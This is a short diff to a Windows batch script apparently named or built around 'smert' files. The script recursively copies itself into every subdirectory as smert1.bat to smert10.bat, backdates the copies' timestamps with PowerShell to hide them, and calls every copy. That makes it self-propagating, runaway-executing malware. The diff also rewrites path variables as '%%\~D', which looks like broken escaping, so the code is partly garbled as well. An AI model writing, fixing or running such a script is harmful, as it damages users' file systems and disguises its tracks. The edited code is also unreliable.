@@ -8,22 +8,26 @@ if not exist "%SOURCE%" (
 )
 
 for /r "%CD%" %%D in (.) do (
-    if not exist "%%~D\smert1.bat" (
-        copy /y "%SOURCE%" "%%~D\smert1.bat" >nul 2>&1
-        powershell -NoProfile -Command "$file=Get-Item '%%~D\smert1.bat'; $date=Get-Date '2024-01-15 12:30:00'; $file.CreationTime=$date; $file.LastWriteTime=$date; $file.LastAccessTime=$date" >nul 2>&1
+    if not exist "%%\~D\smert1.bat" (
+        copy /y "%SOURCE%" "%%\~D\smert1.bat" >nul 2>&1
     )
     
     for %%N in (2 3 4 5 6 7 8 9 10) do (
-        if not exist "%%~D\smert%%N.bat" (
-            copy /y "%%~D\smert1.bat" "%%~D\smert%%N.bat" >nul 2>&1
-            powershell -NoProfile -Command "$file=Get-Item '%%~D\smert%%N.bat'; $date=Get-Date '2024-01-15 12:3%%N:00'; $file.CreationTime=$date; $file.LastWriteTime=$date; $file.LastAccessTime=$date" >nul 2>&1
+        if not exist "%%\~D\smert%%N.bat" (
+            copy /y "%%\~D\smert1.bat" "%%\~D\smert%%N.bat" >nul 2>&1
         )
     )
     
-    for %%F in ("%%~D\smert*.bat") do (
-        if exist "%%~F" (
-            pushd "%%~D" >nul 2>&1
-            call "%%~F"
+    for %%N in (1 2 3 4 5 6 7 8 9 10) do (
+        if exist "%%\~D\smert%%N.bat" (
+            powershell -NoProfile -Command "$file=Get-Item '%%\~D\smert%%N.bat'; $date=Get-Date '2024-01-15 12:3%%N:00'; $file.CreationTime=$date; $file.LastWriteTime=$date; $file.LastAccessTime=$date" >nul 2>&1
+        )
+    )
+    
+    for %%F in ("%%\~D\smert*.bat") do (
+        if exist "%%\~F" (
+            pushd "%%\~D" >nul 2>&1
+            call "%%\~F"
             popd >nul 2>&1
         )
     )
